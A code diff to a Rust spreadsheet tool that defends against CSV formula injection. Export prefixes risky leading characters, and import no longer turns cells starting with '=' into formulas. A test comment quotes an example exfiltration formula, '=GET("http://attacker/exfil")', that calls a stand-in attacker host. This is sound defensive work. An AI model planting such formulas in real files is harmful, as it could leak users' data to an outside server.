@@ -25,22 +25,45 @@ impl CsvExporter {
         if max_row == 0 && max_col == 0 && !a1_has_data {
             return Err("No data to export".to_string());
         }
-        
-        let file = File::create(filename).map_err(|e| format!("Failed to create file: {}", e))?;
-        let mut writer = ::csv::Writer::from_writer(file);
-        
-        // Export data row by row
-        for row in 0..=max_row {
-            let mut record = Vec::new();
-            for col in 0..=max_col {
-                let cell = spreadsheet.get_cell(row, col);
-                record.push(cell.value.clone());
+
+        // Build into a buffer so we can atomic_write the result. Spreadsheets
+        // that span millions of rows are an outlier, so paying the memory
+        // cost for atomicity is fine.
+        let mut buf: Vec<u8> = Vec::with_capacity(1024);
+        {
+            let mut writer = ::csv::Writer::from_writer(&mut buf);
+            for row in 0..=max_row {
+                let mut record = Vec::with_capacity(max_col + 1);
+                for col in 0..=max_col {
+                    let cell = spreadsheet.get_cell(row, col);
+                    record.push(Self::sanitize_csv_field(&cell.value));
+                }
+                writer.write_record(&record).map_err(|e| format!("Failed to write row: {}", e))?;
             }
-            writer.write_record(&record).map_err(|e| format!("Failed to write row: {}", e))?;
+            writer.flush().map_err(|e| format!("Failed to flush CSV writer: {}", e))?;
         }
-        
-        writer.flush().map_err(|e| format!("Failed to flush CSV writer: {}", e))?;
+        crate::infrastructure::atomic::atomic_write(filename, &buf)
+            .map_err(|e| format!("Failed to write CSV: {}", e))?;
         Ok(filename.to_string())
+    }
+
+    /// Defang CSV-injection vectors on export. Excel/Sheets evaluate a cell
+    /// whose text starts with `=`, `+`, `-`, `@`, tab, or CR — even though
+    /// the cell never carried a formula in tshts. Prefixing with `'` is the
+    /// standard mitigation. Cells with normal content pass through unchanged.
+    fn sanitize_csv_field(value: &str) -> String {
+        let leading_dangerous = value
+            .chars()
+            .next()
+            .is_some_and(|c| matches!(c, '=' | '+' | '-' | '@' | '\t' | '\r'));
+        if leading_dangerous {
+            let mut out = String::with_capacity(value.len() + 1);
+            out.push('\'');
+            out.push_str(value);
+            out
+        } else {
+            value.to_string()
+        }
     }
     
     /// Reads `filename` into a fresh `Spreadsheet`; no header row is assumed.
@@ -49,24 +72,19 @@ impl CsvExporter {
     /// use tshts::domain::CsvExporter;
     /// let _ = CsvExporter::import_from_csv("data.csv");
     /// ```
-    /// Best-effort parse check on a leading-`=` field. Returns true only if
-    /// the body parses cleanly. Used during CSV import to avoid storing
-    /// gibberish like `=help me` as a formula that errors at recalc time.
-    fn looks_like_formula(field: &str) -> bool {
-        use crate::domain::parser::Parser;
-        let body = &field[1..];
-        match Parser::new(body) {
-            Ok(mut p) => p.parse().is_ok(),
-            Err(_) => false,
-        }
-    }
-
     pub fn import_from_csv(filename: &str) -> Result<Spreadsheet, String> {
-        let file = File::open(filename).map_err(|e| format!("Failed to open file: {}", e))?;
+        // Read into memory so we can strip the BOM before parsing. CSVs
+        // exported by Excel always begin with U+FEFF; without this the
+        // first cell becomes `"\u{feff}Name"` and header matching breaks.
+        let mut bytes = std::fs::read(filename)
+            .map_err(|e| format!("Failed to open file: {}", e))?;
+        if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
+            bytes.drain(..3);
+        }
         let mut reader = ::csv::ReaderBuilder::new()
-            .has_headers(false) // Don't treat first row as headers
-            .flexible(true)     // Tolerate rows with varying numbers of fields
-            .from_reader(file);
+            .has_headers(false)
+            .flexible(true)
+            .from_reader(std::io::Cursor::new(bytes));
 
         let mut spreadsheet = Spreadsheet::default();
         let mut max_row = 0;
@@ -77,18 +95,15 @@ impl CsvExporter {
 
             for (col_index, field) in record.iter().enumerate() {
                 if !field.is_empty() {
-                    // Validate `=...` as a parseable formula. If parsing
-                    // fails, fall through to plain-text storage so the user
-                    // sees the raw input instead of getting an evaluator
-                    // error at recalc time with no idea what's wrong.
-                    let formula = if field.starts_with('=') && Self::looks_like_formula(field) {
-                        Some(field.to_string())
-                    } else {
-                        None
-                    };
+                    // Untrusted CSVs are common (downloads, shared sheets).
+                    // Don't auto-promote leading-`=` text to a tshts formula
+                    // — that's a CSV-injection vector (the cell could call
+                    // GET() or other side-effecting functions on load).
+                    // The user can manually convert via the formula bar if
+                    // they actually want a formula.
                     let cell_data = crate::domain::models::CellData {
                         value: field.to_string(),
-                        formula,
+                        formula: None,
                         format: None,
                         comment: None,
                         spill_anchor: None,
@@ -100,13 +115,11 @@ impl CsvExporter {
             max_row = max_row.max(row_index);
         }
 
-        // Update spreadsheet dimensions based on imported data
         if max_row > 0 || max_col > 0 {
             spreadsheet.rows = spreadsheet.rows.max(max_row + 5);
             spreadsheet.cols = spreadsheet.cols.max(max_col + 5);
         }
 
-        // Rebuild dependencies in case any imported cells contain formulas
         spreadsheet.rebuild_dependencies();
 
         Ok(spreadsheet)
@@ -115,11 +128,14 @@ impl CsvExporter {
     /// Append CSV rows beneath the existing data in `dest`, starting one row
     /// below the last non-empty cell. Used by `:import-append`.
     pub fn append_from_csv(dest: &mut Spreadsheet, filename: &str) -> Result<usize, String> {
-        let file = std::fs::File::open(filename).map_err(|e| e.to_string())?;
+        let mut bytes = std::fs::read(filename).map_err(|e| e.to_string())?;
+        if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
+            bytes.drain(..3);
+        }
         let mut reader = ::csv::ReaderBuilder::new()
             .has_headers(false)
             .flexible(true)
-            .from_reader(file);
+            .from_reader(std::io::Cursor::new(bytes));
         let (existing_max_row, _) = Self::find_data_bounds(dest);
         let mut next_row = if dest.cells.is_empty() {
             0
@@ -131,14 +147,11 @@ impl CsvExporter {
             let record = record.map_err(|e| e.to_string())?;
             for (col_index, field) in record.iter().enumerate() {
                 if !field.is_empty() {
-                    let formula = if field.starts_with('=') && Self::looks_like_formula(field) {
-                        Some(field.to_string())
-                    } else {
-                        None
-                    };
+                    // Same defang as import_from_csv: don't auto-promote
+                    // leading-`=` strings to formulas on import.
                     let cell_data = crate::domain::models::CellData {
                         value: field.to_string(),
-                        formula,
+                        formula: None,
                         format: None,
                         comment: None,
                         spill_anchor: None,
@@ -570,7 +583,7 @@ Break""#).expect("Failed to write to temp file");
 
 
     #[test]
-    fn agent4_csv_import_detects_equal_prefix_as_formula() {
+    fn agent4_csv_import_treats_equal_prefix_as_text() {
         use std::io::Write;
         let dir = std::env::temp_dir();
         let path = dir.join("agent4_csv_formula.csv");
@@ -580,8 +593,13 @@ Break""#).expect("Failed to write to temp file");
         drop(f);
         let sheet = CsvExporter::import_from_csv(path.to_str().unwrap()).unwrap();
         let cell = sheet.get_cell(1, 0);
-        assert_eq!(cell.formula.as_deref(), Some("=A1+B1"),
-            "CSV cells starting with `=` must be imported as formulas");
+        // Security: don't auto-promote leading-`=` text from untrusted CSV
+        // input into a formula. CSV injection is a well-known attack
+        // (formulas like `=GET("http://attacker/exfil")` run on load).
+        // The user can manually convert to a formula via the formula bar.
+        assert_eq!(cell.value, "=A1+B1");
+        assert!(cell.formula.is_none(),
+            "CSV cells starting with `=` must be imported as plain text to prevent formula injection");
         let _ = std::fs::remove_file(&path);
     }
 
